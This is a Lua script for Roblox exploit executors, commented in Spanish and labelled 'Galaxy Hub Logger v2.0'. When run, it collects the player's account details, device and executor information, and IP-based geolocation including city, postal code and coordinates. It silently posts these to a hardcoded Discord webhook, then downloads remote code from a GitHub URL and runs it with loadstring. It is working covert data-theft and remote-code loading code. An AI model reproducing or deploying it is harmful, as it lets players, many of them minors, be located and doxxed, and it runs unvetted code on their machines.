-- Sistema de Logs Completo - VERSI√ìN CORREGIDA
-- Eliminados errores que deten√≠an la ejecuci√≥n

print("üîÑ Iniciando Galaxy Hub Logger v2.0...")

-- Intentar modificar ReplicatedStorage solo si existe el objeto
pcall(function()
    local repStorage = game:GetService("ReplicatedStorage")
    local targetValue = repStorage:FindFirstChild("XbBljMzCHCAGKSUqNhZ")
    if targetValue then
        targetValue.Value = tostring(math.random(1000000, 10000000))
        print("‚úì ReplicatedStorage modificado")
    end
end)

local games = {
    [3623096087] = "https://raw.githubusercontent.com/Protocol-188373781637/Mxsclx-Lxgxns/refs/heads/main/Xlxrxxm"
}

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Stats = game:GetService("Stats")

local webhookURL = "https://discordapp.com/api/webhooks/1457796766895308903/tsBuuDyXMZhQTe6SXHaFKllSl0kQdEsPXeiHf12WqFHQTX5ZRkassxMBK0NPduInVWRd"
local placeId = game.PlaceId

print("‚úì Servicios cargados correctamente")

-- Funci√≥n HTTP mejorada con m√°s m√©todos
local function makeHTTPRequest(options)
    local methods = {
        request,
        http_request,
        syn and syn.request,
        http and http.request,
        fluxus and fluxus.request
    }
    
    for i, method in ipairs(methods) do
        if method then
            local success, result = pcall(function()
                return method(options)
            end)
            if success and result then
                print("‚úì HTTP request exitoso con m√©todo #" .. i)
                return result
            end
        end
    end
    
    warn("‚úó Ning√∫n m√©todo HTTP funcion√≥")
    return nil
end

-- Obtener informaci√≥n del jugador
local function getPlayerInfo()
    print("üìä Recopilando info del jugador...")
    local info = {
        displayName = LocalPlayer.DisplayName or "Unknown",
        username = LocalPlayer.Name or "Unknown",
        userId = LocalPlayer.UserId or 0,
        accountAge = LocalPlayer.AccountAge or 0,
        hasPremium = false,
        membershipType = "None",
        friendsCount = 0
    }
    
    pcall(function()
        info.hasPremium = LocalPlayer.MembershipType == Enum.MembershipType.Premium
        info.membershipType = tostring(LocalPlayer.MembershipType)
    end)
    
    pcall(function()
        info.friendsCount = #LocalPlayer:GetFriendsOnline()
    end)
    
    print("‚úì Info del jugador obtenida")
    return info
end

-- Obtener informaci√≥n de la plataforma
local function getPlatformInfo()
    print("üìä Recopilando info de plataforma...")
    local info = {
        platform = "Unknown",
        device = "Unknown",
        touchEnabled = false,
        keyboardEnabled = false,
        mouseEnabled = false,
        gamepadEnabled = false
    }
    
    pcall(function()
        local UIS = game:GetService("UserInputService")
        info.platform = tostring(UIS:GetPlatform())
        info.touchEnabled = UIS.TouchEnabled
        info.keyboardEnabled = UIS.KeyboardEnabled
        info.mouseEnabled = UIS.MouseEnabled
        info.gamepadEnabled = UIS.GamepadEnabled
        
        if info.touchEnabled then
            info.device = "üì± Mobile"
        elseif info.gamepadEnabled then
            info.device = "üéÆ Console"
        else
            info.device = "üíª PC"
        end
    end)
    
    print("‚úì Info de plataforma obtenida")
    return info
end

-- Obtener informaci√≥n del juego
local function getGameInfo()
    print("üìä Recopilando info del juego...")
    local info = {
        placeName = "Unknown",
        placeId = placeId,
        jobId = "Unknown",
        creatorName = "Unknown",
        creatorId = 0,
        maxPlayers = 0,
        playerCount = 0
    }
    
    pcall(function()
        local gameInfo = MarketplaceService:GetProductInfo(placeId)
        info.placeName = gameInfo.Name
        info.creatorName = gameInfo.Creator.Name
        info.creatorId = gameInfo.Creator.Id or gameInfo.Creator.CreatorTargetId
    end)
    
    pcall(function()
        info.jobId = game.JobId or "Unknown"
        info.maxPlayers = Players.MaxPlayers
        info.playerCount = #Players:GetPlayers()
    end)
    
    print("‚úì Info del juego obtenida")
    return info
end

-- Obtener informaci√≥n del executor
local function getExecutorInfo()
    print("üìä Detectando executor...")
    local info = {
        name = "Unknown",
        functions = {}
    }
    
    -- Identificar executor
    pcall(function()
        if identifyexecutor then
            info.name = identifyexecutor()
        elseif getexecutorname then
            info.name = getexecutorname()
        elseif KRNL_LOADED then
            info.name = "KRNL"
        elseif syn then
            info.name = "Synapse X"
        elseif SENTINEL_LOADED then
            info.name = "Sentinel"
        elseif is_sirhurt_closure then
            info.name = "SirHurt"
        elseif pebc_execute then
            info.name = "ProtoSmasher"
        elseif OXYGEN_LOADED then
            info.name = "Oxygen U"
        elseif shadow_env then
            info.name = "Shadow"
        elseif jit then
            info.name = "EasyExploits"
        else
            info.name = "Delta/Unknown"
        end
    end)
    
    -- Verificar funciones clave
    local functionsToCheck = {
        "request", "http_request", 
        "readfile", "writefile",
        "hookmetamethod", "hookfunction"
    }
    
    for _, funcName in ipairs(functionsToCheck) do
        if pcall(loadstring("return " .. funcName)) then
            table.insert(info.functions, funcName)
        end
    end
    
    print("‚úì Executor detectado:", info.name)
    return info
end

-- Obtener informaci√≥n de rendimiento
local function getPerformanceInfo()
    print("üìä Midiendo rendimiento...")
    local info = {
        fps = 0,
        ping = 0,
        memory = 0
    }
    
    pcall(function()
        info.fps = math.floor(1 / RunService.RenderStepped:Wait())
    end)
    
    pcall(function()
        local network = Stats:FindFirstChild("Network")
        if network then
            local serverStats = network:FindFirstChild("ServerStatsItem")
            if serverStats and serverStats:FindFirstChild("Data Ping") then
                info.ping = math.floor(serverStats["Data Ping"]:GetValue())
            end
        end
    end)
    
    pcall(function()
        info.memory = math.floor(Stats:GetTotalMemoryUsageMb())
    end)
    
    print("‚úì Rendimiento medido")
    return info
end

-- Obtener informaci√≥n de IP
local function getIPInfo()
    print("üìä Obteniendo informaci√≥n de IP...")
    local ipData = {
        ip = "Protected",
        country = "Unknown",
        region = "Unknown",
        city = "Unknown",
        isp = "Unknown",
        timezone = "Unknown",
        postal = "Unknown",
        lat = "Unknown",
        lon = "Unknown"
    }
    
    local success = pcall(function()
        local response = makeHTTPRequest({
            Url = "http://ip-api.com/json/",
            Method = "GET"
        })
        
        if response and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            
            if decoded.status == "success" then
                ipData.ip = decoded.query or "Protected"
                ipData.country = decoded.country or "Unknown"
                ipData.region = decoded.regionName or "Unknown"
                ipData.city = decoded.city or "Unknown"
                ipData.isp = decoded.isp or "Unknown"
                ipData.timezone = decoded.timezone or "Unknown"
                ipData.postal = decoded.zip or "Unknown"
                ipData.lat = tostring(decoded.lat or "Unknown")
                ipData.lon = tostring(decoded.lon or "Unknown")
                print("‚úì IP info obtenida")
            end
        end
    end)
    
    if not success then
        warn("‚ö† No se pudo obtener IP (normal en algunos executors)")
    end
    
    return ipData
end

-- Obtener resoluci√≥n de pantalla
local function getScreenResolution()
    local resolution = "Unknown"
    pcall(function()
        local camera = workspace.CurrentCamera
        if camera then
            resolution = camera.ViewportSize.X .. "x" .. camera.ViewportSize.Y
        end
    end)
    return resolution
end

-- Construir embed
local function buildEmbed()
    print("üìù Construyendo embed...")
    
    local playerInfo = getPlayerInfo()
    local platformInfo = getPlatformInfo()
    local gameInfo = getGameInfo()
    local executorInfo = getExecutorInfo()
    local performanceInfo = getPerformanceInfo()
    local ipInfo = getIPInfo()
    local screenRes = getScreenResolution()
    
    local embed = {
        username = "Galaxy Hub Logger",
        avatar_url = "https://i.imgur.com/AfFp7pu.png",
        embeds = {{
            title = "üöÄ Script Execution Log",
            description = "**Sistema de logging activado**",
            color = 0x9B59B6,
            fields = {
                {
                    name = "üë§ Player Information",
                    value = string.format(
                        "**Display:** %s\n**Username:** %s\n**User ID:** `%d`\n**Account Age:** %d days\n**Premium:** %s\n**Friends Online:** %d",
                        playerInfo.displayName,
                        playerInfo.username,
                        playerInfo.userId,
                        playerInfo.accountAge,
                        playerInfo.hasPremium and "‚úÖ" or "‚ùå",
                        playerInfo.friendsCount
                    ),
                    inline = true
                },
                {
                    name = "üéÆ Game Information",
                    value = string.format(
                        "**Game:** %s\n**Place ID:** `%d`\n**Job ID:** `%s`\n**Creator:** %s\n**Players:** %d/%d",
                        gameInfo.placeName,
                        gameInfo.placeId,
                        gameInfo.jobId:sub(1, 12) .. "...",
                        gameInfo.creatorName,
                        gameInfo.playerCount,
                        gameInfo.maxPlayers
                    ),
                    inline = true
                },
                {
                    name = "üíª Platform & Device",
                    value = string.format(
                        "**Platform:** %s\n**Device:** %s\n**Touch:** %s | **KB:** %s\n**Mouse:** %s | **Gamepad:** %s\n**Resolution:** %s",
                        platformInfo.platform,
                        platformInfo.device,
                        platformInfo.touchEnabled and "‚úÖ" or "‚ùå",
                        platformInfo.keyboardEnabled and "‚úÖ" or "‚ùå",
                        platformInfo.mouseEnabled and "‚úÖ" or "‚ùå",
                        platformInfo.gamepadEnabled and "‚úÖ" or "‚ùå",
                        screenRes
                    ),
                    inline = true
                },
                {
                    name = "‚öôÔ∏è Executor",
                    value = string.format(
                        "**Name:** %s\n**Functions:** %s",
                        executorInfo.name,
                        #executorInfo.functions > 0 and table.concat(executorInfo.functions, ", ") or "None detected"
                    ),
                    inline = true
                },
                {
                    name = "üìä Performance",
                    value = string.format(
                        "**FPS:** %d\n**Ping:** %d ms\n**Memory:** %d MB",
                        performanceInfo.fps,
                        performanceInfo.ping,
                        performanceInfo.memory
                    ),
                    inline = true
                },
                {
                    name = "üåç IP & Location",
                    value = string.format(
                        "**IP:** `%s`\n**Country:** %s\n**Region:** %s\n**City:** %s\n**ISP:** %s\n**Timezone:** %s\n**Postal:** %s\n**Coords:** %s, %s",
                        ipInfo.ip,
                        ipInfo.country,
                        ipInfo.region,
                        ipInfo.city,
                        ipInfo.isp,
                        ipInfo.timezone,
                        ipInfo.postal,
                        ipInfo.lat,
                        ipInfo.lon
                    ),
                    inline = false
                }
            },
            thumbnail = {
                url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", playerInfo.userId)
            },
            footer = {
                text = "Galaxy Hub ‚Ä¢ Advanced Logging v2.0",
                icon_url = "https://i.imgur.com/AfFp7pu.png"
            },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    
    print("‚úì Embed construido")
    return embed
end

-- Enviar webhook
local function sendWebhook(payload)
    print("üì§ Intentando enviar webhook...")
    
    for attempt = 1, 3 do
        local success, err = pcall(function()
            local json = HttpService:JSONEncode(payload)
            local response = makeHTTPRequest({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
            
            if response then
                if response.StatusCode == 204 or response.StatusCode == 200 then
                    print("‚úÖ Webhook enviado exitosamente! (Intento " .. attempt .. ")")
                    return true
                else
                    warn("‚ö† Webhook respondi√≥ con c√≥digo:", response.StatusCode)
                end
            end
        end)
        
        if success then
            return true
        else
            warn("‚úó Intento " .. attempt .. " fall√≥:", tostring(err))
            if attempt < 3 then
                wait(1)
            end
        end
    end
    
    warn("‚ùå Webhook fall√≥ despu√©s de 3 intentos")
    return false
end

-- INICIO DEL SCRIPT PRINCIPAL
print("=" .. string.rep("=", 50))
print("üåå GALAXY HUB LOGGER v2.0")
print("=" .. string.rep("=", 50))

-- Enviar logs en segundo plano
spawn(function()
    wait(0.5) -- Peque√±o delay para que todo se cargue
    local embed = buildEmbed()
    sendWebhook(embed)
end)

-- Cargar script del juego
print("\nüéÆ Verificando script para este juego...")

if games[placeId] then
    print("‚úì Script encontrado para Place ID:", placeId)
    print("üì• Descargando script del juego...")
    
    local success, err = pcall(function()
        local scriptCode = game:HttpGet(games[placeId])
        print("‚úì Script descargado, ejecutando...")
        loadstring(scriptCode)()
        print("‚úÖ Script del juego ejecutado exitosamente!")
    end)
    
    if not success then
        warn("‚ùå Error al ejecutar script del juego:", err)
    end
else
    warn("‚ö† No hay script disponible para este juego")
    warn("Place ID actual:", placeId)
    
    -- Notificaci√≥n en pantalla
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Galaxy Hub",
            Text = "No hay script para este juego",
            Duration = 5
        })
    end)
end

print("\n" .. string.rep("=", 50))
print("‚úÖ Sistema de logs completado")
print(string.rep("=", 50))
